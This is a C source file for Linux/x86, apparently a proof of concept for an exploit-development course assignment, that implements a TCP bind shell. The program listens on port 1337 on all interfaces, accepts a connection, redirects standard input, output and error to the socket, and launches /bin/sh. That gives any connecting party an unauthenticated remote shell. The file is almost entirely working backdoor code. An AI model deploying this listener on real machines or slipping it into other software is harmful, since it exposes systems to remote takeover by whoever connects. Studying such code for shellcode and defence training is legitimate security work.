// SLAE - Assignment #1: Shell Bind TCP (Linux/x86) PoC
// Author:  Julien Ahrens (@MrTuxracer)
// Website:  http://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
	int i; // used for dup2 later
	int sockfd; // socket file descriptor
	int clientfd; // client file descriptor
	socklen_t socklen; // socket-length for new connections
	
	struct sockaddr_in srv_addr; // server aka listen address
	struct sockaddr_in cli_addr; // client address

	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order
	srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order

	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
	
	// bind socket
	bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );
	
	// listen on socket
	listen(sockfd, 0);

	// accept new connections
	socklen = sizeof(cli_addr);
	clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );
	
	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(clientfd, i);

	// magic
	execve( "/bin/sh", NULL, NULL );
}
